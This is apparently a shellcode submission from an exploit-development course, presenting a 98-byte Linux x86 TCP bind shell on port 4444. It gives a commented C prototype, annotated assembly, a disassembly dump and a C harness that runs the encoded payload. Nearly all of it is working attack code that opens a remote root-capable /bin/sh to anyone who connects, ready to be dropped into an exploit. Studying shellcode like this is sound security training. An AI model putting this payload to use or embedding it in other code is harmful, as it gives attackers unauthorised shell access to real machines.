/*
# Linux x86 TCP Bind Shell Port 4444 (98 bytes)
# Author: sajith
# Tested on: i686 GNU/Linux
# Shellcode Length: 98
# SLAE - 750

------------c prog ---poc by sajith shetty----------
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>

int main(void)
{

int sock_file_des, clientfd;
struct sockaddr_in sock_ad;
//[1]we need to create the socket connection using socket call function

//[*]Man page for socket call
//----->int socket(int domain, int type, int protocol);
// domain = AF_INET (IPv4 Internet protocol  family  which will be used for communication)
// type   = SOCK_STREAM (Provides sequenced, reliable, two-way, connection-based byte  streams.  An out-of-band data transmission mechanism may be supported
// protocol = 0 (The protocol specifies a particular protocol to be used with the socket.Normally only a single protocol exists to support a particular socket  type within a given protocol family, in which case protocol can be specified as 0.

sock_file_des = socket(AF_INET, SOCK_STREAM, 0);
//[2]Binds the socket to localhost and port (here will use 4444) using bind call.

//[*]Man page for bind call
//------->int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
//   sockfd = sock_file_des
//   const struct sockaddr *addr = (struct sockaddr *)&sock_ad (bind() assigns the address specified to by addr to the socket referred to by the file descriptor sockfd)
//   socklen_t addrlen = sizeof(sock_ad) (addrlen specifies  the  size,  in bytes, of the address structure pointed to by addr.)

sock_ad.sin_family = AF_INET; // Host byte order.(2)
sock_ad.sin_port = htons(4444);// network byte order
sock_ad.sin_addr.s_addr = INADDR_ANY;//(0)bindshell will listen on any address

bind(sock_file_des, (struct sockaddr *) &sock_ad, sizeof(sock_ad));


//[3]Waits for incoming connection using call to listen

//[*]Man page for listen call
//------->int listen(int sockfd, int backlog);
// sockfd = sock_file_des (The sockfd argument is a file descriptor that refers to a socket of type SOCK_STREAM)
// backlog = 0 (The backlog argument defines the maximum length to which the queue of pending connections for sockfd  may  grow)


listen(sock_file_des, 0);

//[4]Accept the connection using call to accept

//[*]Man page to accept call
//------->int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
// sockfd = sock_file_des
// struct sockaddr *addr = NULL (The  argument  addr is a pointer to a sockaddr structure.  This structure is filled in with the address of the peer socket, as known to the communications layer.When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL.
// socklen_t *addrlen = NULL


clientfd = accept(sock_file_des, NULL, NULL);

//[5]Redirect file descriptors (STDIN, STDOUT and STDERR) to the socket using DUP2

//[*]Man page for dup2 (duplicate a file descriptor)
//------->int dup2(int oldfd, int newfd);
// oldfd = clientfd
// newfd = 0(stdin) , 1(stdout), 2(stderr)
dup2(clientfd, 0); // stdin
dup2(clientfd, 1); // stdout
dup2(clientfd, 2); // stderr

//[6]Execute shell (here we use /bin/sh) using execve call

//[*]Man page for execve call
//------->int execve(const char *filename, char *const argv[],char *const envp[]);
// char *filename = /bin/sh
// char *const argv[] = NULL
// char *const envp[] = NULL

execve("/bin/sh",NULL,NULL);
}
----------------------end of c program--------------

global _start

section .text

_start:

;syscall for socket
;cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
;#define __NR_socketcall 102 (0x66 in hex)
;sock_file_des = socket(AF_INET, SOCK_STREAM, 0)
;AF_INET = 2  ( bits/socket.h)
;SOCK_STREAM = 1 (bits/socket.h)
;socket(2,1,0)
xor eax, eax ; zero out eax register using XOR operation
xor ebx, ebx ; zero out ebx register using XOR operation
push eax   ; move 0 to stack (protocol=0)
mov al, 0x66 ; moves socket call number to al register
mov bl, 0x1 ; moves 0x1 to bl register
push ebx ; value in ebx=1 is pushed in to the stack (sock_stream =1)
push 0x2 ; value 0x2 is pushed onto stack (AF_INET=2)
mov ecx, esp ; save the pointer to args in ecx
int 0x80 ; socket()
mov esi, eax ; store sockfd in esi register

;sock_ad.sin_addr.s_addr = INADDR_ANY;//0, bindshell will listen on any address
;sock_ad.sin_port = htons(4444);// port to bind.(4444)
;sock_ad.sin_family = AF_INET; // TCP protocol (2).
xor edx, edx ; zero out edx register using XOR operation
push edx ; push 0 on to stack (INADDR_ANY)
push word 0x5C11; htons(4444)
push word 0x2 ; AF_INET = 2
mov ecx, esp ; save the pointer to args in ecx

;bind(sock_file_des, (struct sockaddr *) &sock_ad, sizeof(sock_ad));
;cat /usr/include/linux/net.h | grep bind
;bind = 2

mov al, 0x66 ; sys socket call
mov bl, 0x2 ; bind =2
push 0x10 ; size of sock_ad (sizeof(sock_ad))
push ecx ; struct pointer
push esi ; push sockfd (sock_file_des) onto stack
mov ecx, esp ; save the pointer to args in ecx
int 0x80


;listen(sock_file_des, 0);
;cat /usr/include/linux/net.h | grep listen
; listen =4

mov al, 0x66 ; sys socket call
mov bl, 0x4 ; listen=4
push edx ; push 0 onto stack (backlog=0)
push esi ; sockfd (sock_file_des )
mov ecx, esp ; save the pointer to args in ecx
int 0x80

;clientfd = accept(sock_file_des, NULL, NULL)
;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
;cat /usr/include/linux/net.h | grep accept
; accept=5

mov al, 0x66 ; sys socket call
mov bl, 0x5         ; accept =5
push edx ; null value socklen_t *addrlen
push edx ; null value sockaddr *addr
push esi ; sockfd (sock_file_des )
mov ecx, esp ; save the pointer to args in ecx
int 0x80

;int dup2(int oldfd, int newfd);
;dup2(clientfd, 0); // stdin
;dup2(clientfd, 1); // stdout
;dup2(clientfd, 2); // stderr

mov ebx, eax ;move client fd to ebx
xor ecx, ecx ; xor to clear out ecx
mov cl, 3 ; counter to loop 3 times

loopinghere:

mov al, 0x3f ; sys call for dup2
int 0x80
dec cl ; decrement till 0
jns loopinghere ; loop as long sign flag is not set

;Execute shell (here we use /bin/sh) using execve call
;execve("//bin/sh",["//bin/sh"])

mov   al, 11           ; execve
    push  edx               ; push null
    push  0x68732f6e        ; hs/b
    push  0x69622f2f        ; ib//
    mov   ebx,esp           ; save pointer
    push  edx               ; push null
    push  ebx               ; push pointer
    mov   ecx,esp           ; save pointer
    int   0x80
-------------obj dump------------
finalcode:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060: 31 c0                 xor    eax,eax
 8048062: 31 db                 xor    ebx,ebx
 8048064: 50                   push   eax
 8048065: b0 66                 mov    al,0x66
 8048067: b3 01                 mov    bl,0x1
 8048069: 53                   push   ebx
 804806a: 6a 02                 push   0x2
 804806c: 89 e1                 mov    ecx,esp
 804806e: cd 80                 int    0x80
 8048070: 89 c6                 mov    esi,eax
 8048072: 31 d2                 xor    edx,edx
 8048074: 52                   push   edx
 8048075: 66 68 11 5c           pushw  0x5c11
 8048079: 66 6a 02             pushw  0x2
 804807c: 89 e1                 mov    ecx,esp
 804807e: b0 66                 mov    al,0x66
 8048080: b3 02                 mov    bl,0x2
 8048082: 6a 10                 push   0x10
 8048084: 51                   push   ecx
 8048085: 56                   push   esi
 8048086: 89 e1                 mov    ecx,esp
 8048088: cd 80                 int    0x80
 804808a: b0 66                 mov    al,0x66
 804808c: b3 04                 mov    bl,0x4
 804808e: 52                   push   edx
 804808f: 56                   push   esi
 8048090: 89 e1                 mov    ecx,esp
 8048092: cd 80                 int    0x80
 8048094: b0 66                 mov    al,0x66
 8048096: b3 05                 mov    bl,0x5
 8048098: 52                   push   edx
 8048099: 52                   push   edx
 804809a: 56                   push   esi
 804809b: 89 e1                 mov    ecx,esp
 804809d: cd 80                 int    0x80
 804809f: 89 c3                 mov    ebx,eax
 80480a1: 31 c9                 xor    ecx,ecx
 80480a3: b1 03                 mov    cl,0x3

080480a5 <loopinghere>:
 80480a5: b0 3f                 mov    al,0x3f
 80480a7: cd 80                 int    0x80
 80480a9: fe c9                 dec    cl
 80480ab: 79 f8                 jns    80480a5 <loopinghere>
 80480ad: b0 0b                 mov    al,0xb
 80480af: 52                   push   edx
 80480b0: 68 6e 2f 73 68       push   0x68732f6e
 80480b5: 68 2f 2f 62 69       push   0x69622f2f
 80480ba: 89 e3                 mov    ebx,esp
 80480bc: 52                   push   edx
 80480bd: 53                   push   ebx
 80480be: 89 e1                 mov    ecx,esp
 80480c0: cd 80                 int    0x80

-----------------------------------------------
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\x31\xc0\x31\xdb\x50\xb0\x66\xb3\x01\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x31\xd2\x52\x66\x68"
"\x11\x5c" // port number 4444
"\x66\x6a\x02\x89\xe1\xb0\x66\xb3\x02\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80";


main()
{
  printf("Shellcode Length:  %d\n", strlen(code));
int (*ret)() = (int(*)())code;
ret();
}